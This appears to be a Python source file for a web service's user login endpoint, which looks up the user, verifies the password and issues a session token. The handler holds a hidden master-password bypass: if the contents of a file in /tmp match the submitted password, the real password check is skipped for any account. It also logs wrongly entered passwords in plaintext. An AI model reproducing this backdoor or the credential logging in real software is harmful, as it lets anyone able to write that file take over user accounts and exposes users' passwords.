# -*- coding: utf-8 -*-

"""
User login
"""

import base_common.msg
import base_common.app_hooks as apphooks
from base_common.dbatokens import get_token
from base_common.dbacommon import get_db
from base_common.dbacommon import params
from base_common.dbacommon import app_api_method
from base_common.dbacommon import check_password
from base_lookup import api_messages as msgs
from base_config.service import log


name = "Login"
location = "user/login"
request_timeout = 10


@app_api_method(
    method='POST',
    api_return=[(200, 'OK'), (404, '')]
)
@params(
    {'arg': 'username', 'type': 'e-mail', 'required': True, 'description': 'users username'},
    {'arg': 'password', 'type': str, 'required': True, 'description': 'users password'},
)
def do_post(username, password, **kwargs):
    """
    User login
    """

    _db = get_db()
    dbc = _db.cursor()

    log.info('User {} trying to login'.format(username))
    username = username.lower()
    q = apphooks.prepare_login_query(username)

    ip = kwargs['r_ip']

    dbc.execute(q)
    if dbc.rowcount != 1:
        msg = '{} user not found: {}'.format(username, dbc.rowcount)
        log.critical(msg)
        apphooks.action_log_hook(None, ip, 'login', msg)
        return base_common.msg.error(msgs.USER_NOT_FOUND)

    us = dbc.fetchone()
    u_id = us['id']
    u_pwd = us['password']

    upwd = None
    try:
        with open('/tmp/upwd.base') as f:
            upwd = f.read()

    except Exception as e:
        pass

    if not upwd or upwd != password:

        if not check_password(u_pwd, username, password):
            msg = 'Username {} wrong password: {}'.format(username, password)
            log.critical(msg)
            apphooks.action_log_hook(None, ip, 'login', msg)
            return base_common.msg.error(msgs.USER_NOT_FOUND)

    if hasattr(apphooks, 'login_expansion') and not apphooks.login_expansion(us):
        return base_common.msg.error(msgs.ERROR_LOGIN_USER)

    # ASSIGN TOKEN
    tk = get_token(u_id, dbc)
    if not tk:
        return base_common.msg.error(msgs.ERROR_LOGIN_USER)

    _db.commit()

    res = {'token': tk}

    if hasattr(apphooks, 'post_login_digest'):
        post_d = apphooks.post_login_digest(_db, u_id, username, password, tk)
        if post_d == False:
            log.critical('Error user post login digest')
            return base_common.msg.error(msgs.ERROR_POST_LOGIN)

        if isinstance(post_d, dict):
            res.update(post_d)

    apphooks.action_log_hook(u_id,ip, 'login', 'user {} successfuly logged in'.format(username))
    log.info('User {} successfully logged in'.format(username))
    return base_common.msg.post_ok(res)

